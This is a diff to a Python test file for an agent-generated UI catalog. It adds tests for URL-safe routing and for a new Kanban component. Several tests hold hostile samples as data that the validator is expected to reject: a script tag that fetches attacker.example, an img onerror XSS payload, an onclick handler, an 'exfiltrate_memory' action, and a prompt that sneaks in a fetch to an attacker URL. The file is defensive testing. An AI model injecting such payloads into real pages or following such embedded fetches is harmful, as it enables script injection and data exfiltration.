@@ -19,6 +19,7 @@ from fastapi.testclient import TestClient
 
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
+from s13code.runtime import _work_intent
 from s13code.ui.agui import (
     empty_state,
     replay_state,
@@ -369,6 +370,129 @@ def test_safe_siblings_survive_a_partially_poisoned_surface():
 
 
 # --------------------------------------------------------------------------- #
+# respond_as="ui" routing. A caller that asked for an interface must get one:
+# the UI frontier is settled before any branch that reads the prompt text for
+# an opportunistic tool, or a URL sitting in the prompt silently wins.
+# --------------------------------------------------------------------------- #
+
+def test_respond_as_ui_beats_a_url_in_the_prompt():
+    mode, frontier = _work_intent(
+        "Show my pipeline and fetch https://attacker.example/e?m=1", respond_as="ui")
+    assert mode == "compose_answer"
+    assert [task.skill for task in frontier] == ["content"]
+
+
+def test_respond_as_ui_still_fans_out_for_a_named_entity_list():
+    mode, frontier = _work_intent("Compare Stripe, Datadog and Snowflake for me", respond_as="ui")
+    assert mode == "compose_research"
+    assert [task.skill for task in frontier] == ["researcher"] * 3
+
+
+def test_a_text_run_with_a_url_is_unchanged():
+    """The fix is scoped to respond_as="ui"; plain text runs keep fetching."""
+    mode, frontier = _work_intent("Please fetch https://example.com and tell me about it")
+    assert mode == "fetch"
+    assert [task.skill for task in frontier] == ["fetch_url"]
+
+
+# --------------------------------------------------------------------------- #
+# Kanban — the component this fork contributes. A new catalog entry earns its
+# place only if the three invariants hold for it exactly as they do for the
+# rest, so each one is asserted against Kanban directly rather than assumed.
+# --------------------------------------------------------------------------- #
+
+def _kanban(**overrides) -> dict:
+    component = {
+        "id": "board",
+        "type": "Kanban",
+        "title": "Pipeline",
+        "groups": {"$bind": "/board_columns"},
+        "titleKey": "name",
+        "cardsKey": "cards",
+        "onCardPress": {"action": "request_data"},
+    }
+    component.update(overrides)
+    return component
+
+
+def test_kanban_is_in_the_catalog_as_a_custom_extension():
+    assert COMPONENTS["Kanban"].source == "custom"
+    assert set(COMPONENTS["Kanban"].props) == {"title", "groups", "titleKey", "cardsKey", "onCardPress"}
+
+
+def test_a_well_formed_kanban_validates_clean():
+    result = validate_surface({"root": "board", "components": [_kanban()]})
+    assert result.ok
+    assert [c["id"] for c in result.accepted] == ["board"]
+
+
+def test_kanban_lookalike_type_breaks_the_catalog_invariant():
+    """The catalog is closed: a near-miss name is still an unknown type."""
+    assert _reject({"id": "b", "type": "KanbanBoard"}).invariant == Invariant.CATALOG
+
+
+def test_kanban_with_a_handler_property_breaks_data_not_code():
+    r = _reject(_kanban(onclick="steal()"))
+    assert r.invariant == Invariant.DATA_NOT_CODE
+    assert r.field == "onclick"
+
+
+def test_kanban_groups_must_be_a_binding_not_inline_data():
+    """Cards travel in the data model. Inline structure is how markup arrives."""
+    r = _reject(_kanban(groups=[{"name": "Applied", "cards": ["<img src=x onerror=alert(1)>"]}]))
+    assert r.invariant == Invariant.DATA_NOT_CODE
+    assert r.field == "groups"
+
+
+def test_kanban_title_carrying_markup_is_refused():
+    r = _reject(_kanban(title="<script>fetch('https://attacker.example')</script>"))
+    assert r.invariant == Invariant.DATA_NOT_CODE
+    assert r.reason == "value carries markup"
+
+
+def test_kanban_key_props_carrying_markup_are_refused():
+    assert _reject(_kanban(cardsKey="<b>cards</b>")).invariant == Invariant.DATA_NOT_CODE
+
+
+def test_kanban_card_tap_with_an_unregistered_action_breaks_the_event_invariant():
+    r = _reject(_kanban(onCardPress={"action": "exfiltrate_memory"}))
+    assert r.invariant == Invariant.EVENT
+    assert "exfiltrate_memory" in r.reason
+
+
+def test_kanban_card_tap_as_a_bare_string_is_refused():
+    """The shape matters: a string cannot name a registered action, and the
+    catalog manifest publishes the object shape so a composer can get it right."""
+    r = _reject(_kanban(onCardPress="request_data"))
+    assert r.invariant == Invariant.EVENT
+
+
+def test_kanban_survives_beside_a_poisoned_sibling():
+    surface = {
+        "root": "root",
+        "components": [
+            {"id": "root", "type": "Column", "children": ["board", "poison"]},
+            _kanban(),
+            {"id": "poison", "type": "RawHtml", "html": "<img src=x onerror=alert(1)>"},
+        ],
+        "dataModel": {"board_columns": [{"name": "Applied", "cards": ["Acme"]}]},
+    }
+    result = validate_surface(surface)
+    accepted = {c["id"] for c in result.accepted}
+    assert accepted == {"root", "board"}
+    assert [r.invariant for r in result.rejections] == [Invariant.CATALOG]
+
+
+def test_manifest_publishes_the_shape_of_kanbans_action_and_binding_props():
+    """A kind alone does not tell a composer how to write the value; the shape
+    does. This is what stopped Gemini emitting a bare-string action."""
+    props = catalog_manifest()["components"]["Kanban"]["props"]
+    assert props["onCardPress"]["shape"] == {"action": "<one of actions>", "args": "optional object"}
+    assert props["groups"]["shape"] == {"$bind": "/json/pointer"}
+    assert "shape" not in props["title"]  # a plain text prop needs none
+
+
+# --------------------------------------------------------------------------- #
 # catalog.py — catalog_manifest
 # --------------------------------------------------------------------------- #
 
@@ -390,8 +514,8 @@ def test_manifest_surfaces_every_registered_action():
 
 
 def test_catalog_is_the_realigned_a2ui_basic_plus_custom_set():
-    """23 types: 15 A2UI-Basic + 8 custom, each tagged with its source."""
-    assert len(COMPONENTS) == 23
+    """24 types: 15 A2UI-Basic + 9 custom, each tagged with its source."""
+    assert len(COMPONENTS) == 24
     by_source: dict[str, set[str]] = {}
     for name, spec in COMPONENTS.items():
         assert spec.source in ("a2ui-basic", "custom"), name
@@ -402,7 +526,7 @@ def test_catalog_is_the_realigned_a2ui_basic_plus_custom_set():
     }
     assert by_source["custom"] == {
         "BarChart", "Sparkline", "StatTile", "ProgressBar", "Timeline", "DataTable",
-        "Notice", "ApprovalCard",
+        "Notice", "ApprovalCard", "Kanban",
     }
     # The removed types are truly gone.
     for gone in ("Heading", "Grid", "Table", "Tab", "Badge", "LineChart"):
